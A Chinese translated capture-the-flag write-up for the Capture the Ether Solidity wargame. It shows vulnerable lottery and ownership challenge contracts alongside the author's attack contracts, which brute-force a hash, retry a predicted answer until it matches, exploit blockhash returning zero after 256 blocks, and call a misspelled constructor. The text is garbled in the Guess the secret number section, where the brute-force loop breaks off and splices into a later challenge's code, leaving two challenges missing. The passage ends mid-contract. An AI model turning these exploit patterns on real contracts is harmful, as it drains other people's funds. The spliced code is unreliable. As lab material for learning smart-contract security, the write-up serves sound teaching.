# capture the ether write up(Lotteries Accounts and Miscellaneous)
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
这是capture the ether的write up
的另一部分，Math部分的writeup见此，[传送门](https://www.anquanke.com/post/id/153375)
## Lotteries
这一部分主要讲的是合约里的随机数生成
###  0x1. Guess the number
    pragma solidity ^0.4.21;
    contract GuessTheNumberChallenge {
        uint8 answer = 42;
        function GuessTheNumberChallenge() public payable {
            require(msg.value == 1 ether);
        }
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
            if (n == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
这是最简单的，直接把answer给出来了，那么我们直接调用guess函数并传参42即可，同时注意需要发送1 ether，这样就可以把创建合约时存进去的1
ether提取出来
###  0x2. Guess the secret number
    pragma solidity ^0.4.21;
    contract GuessTheSecretNumberChallenge {
        bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;
        function GuessTheSecretNumberChallenge() public payable {
            require(msg.value == 1 ether);
        }
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
        function guess(uint8 n) public payable {
            require(msg.value == 1 ether);
            if (keccak256(n) == answerHash) {
                msg.sender.transfer(2 ether);
            }
        }
    }
这道题算是上题的进阶版，不过它给出的是一串hash值，我们要完成挑战需要把破解后的数字发送过去，看上去这有点难为人，毕竟这又不是在php里，还有弱类型比较等骚操作，不过我们发现它给出的参数n的数据类型为uint8，这代表着其长度只有八位，也就是0到255，这样就很简单了，下面是一个简单的爆破合约:
    contract crack {
        bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;
        uint8 public result;
        function crackresult() returns (uint8) {
            for (uint8 i = 0; i  settlementBlockNumber);
            uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
            guesser = 0;
            if (guess == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
这题也有点意思，随机数的生成方式与上一题是一样的，但是它多了个lockInGuess函数，此处我们就需要输入我们guess的值，然后使用settlementBlockNumber限制为我们调用lockInGuess的交易所在区块之后的区块，这样我们就不能在同一个区块里调用lockInGuess与settle函数了，所以这个挑战的名字就叫预测未来
看起来我们要完成挑战就得提前知道后面的区块的信息，这似乎是不可能的，事实上也是不可能的，这里的关键是在于guess的大小为10，也就是0 到
9，这就为我们去爆破它提供了可能，虽然我们无法去就挑战合约的answer，但是我们可以让answer来就我们，反正按照规则一次一次地尝试生成answer，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数，以免guesser被清零，我们又得投1
ether进去
所以攻击合约如下
    contract attacker {
        PredictTheFutureChallenge target;
        uint public result;
        function attacker() public payable {
            target = PredictTheFutureChallenge(address of your challenge);
            target.lockInGuess.value(1 ether)(8);
        }
        function exploit() public payable {
            result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
                if (result == 8) {
                target.settle();
            }
        }
        function () public payable {
        }
    }
首先是随便猜个数字，因为锁定用户用的是msg.sender，所以我们必须用攻击合约来完成这一步骤，这里我选择的是8，然后部署攻击合约，注意部署时需要发送1
ether，然后就是拼人品的时候了，反正就一直调用exploit函数，人品好的可能两三次就成功通过了，脸黑的可能得十几次几十次，毕竟平均也得10次，反正每次调用完查看下isComplete看是否成功，可以多给点gas以提高下优先级，多少能省点时间，反正也不是真钱
###  0x6. Predict the block hash
    pragma solidity ^0.4.21;
    contract PredictTheBlockHashChallenge {
        address guesser;
        bytes32 guess;
        uint256 settlementBlockNumber;
        function PredictTheBlockHashChallenge() public payable {
            require(msg.value == 1 ether);
        }
        function isComplete() public view returns (bool) {
            return address(this).balance == 0;
        }
        function lockInGuess(bytes32 hash) public payable {
            require(guesser == 0);
            require(msg.value == 1 ether);
            guesser = msg.sender;
            guess = hash;
            settlementBlockNumber = block.number + 1;
        }
        function settle() public {
            require(msg.sender == guesser);
            require(block.number > settlementBlockNumber);
            bytes32 answer = block.blockhash(settlementBlockNumber);
            guesser = 0;
            if (guess == answer) {
                msg.sender.transfer(2 ether);
            }
        }
    }
这个挑战还是要你预测，代码主体跟前面那个差不多，但是这个直接要你猜当前块的hash，我们知道这是根本不可能的，乍一看确实让人有点懵逼,不过此处的突破点在于block.blockhash这个函数，它可以获取给定的区块号的hash值，但只支持最近的256个区块，不包含当前区块，对于256个区块之前的函数将返回0，知道了这些就好办了，先传递guess为0，然后等待256个区块再调用settle函数即可
不知道该等多久的可以使用web3.eth.getBlockNumber()来方便地获取最近一次的区块号
## Miscellaneous
这部分是杂项
###  0x1. Assume ownership
    pragma solidity ^0.4.21;
    contract AssumeOwnershipChallenge {
        address owner;
        bool public isComplete;
        function AssumeOwmershipChallenge() public {
            owner = msg.sender;
        }
        function authenticate() public {
            require(msg.sender == owner);
            isComplete = true;
        }
    }
这一关乍一看有点懵逼，不知道靠的是啥，不过仔细观察发现考点是在构造函数上，此处出现了拼写错误，导致合约部署时该函数并没有执行，于是可被我们所调用，这样就可以将owner设置为我们的账户地址了，操作非常简单，就不赘述了
###  0x2. Token bank
    pragma solidity ^0.4.21;
    interface ITokenReceiver {
        function tokenFallback(address from, uint256 value, bytes data) external;
    }
    contract SimpleERC223Token {
        // Track how many tokens are owned by each address.
        mapping (address => uint256) public balanceOf;
        string public name = "Simple ERC223 Token";
        string public symbol = "SET";
        uint8 public decimals = 18;
        uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);
        event Transfer(address indexed from, address indexed to, uint256 value);
        function SimpleERC223Token() public {
            balanceOf[msg.sender] = totalSupply;
            emit Transfer(address(0), msg.sender, totalSupply);
        }
        function isContract(address _addr) private view returns (bool is_contract) {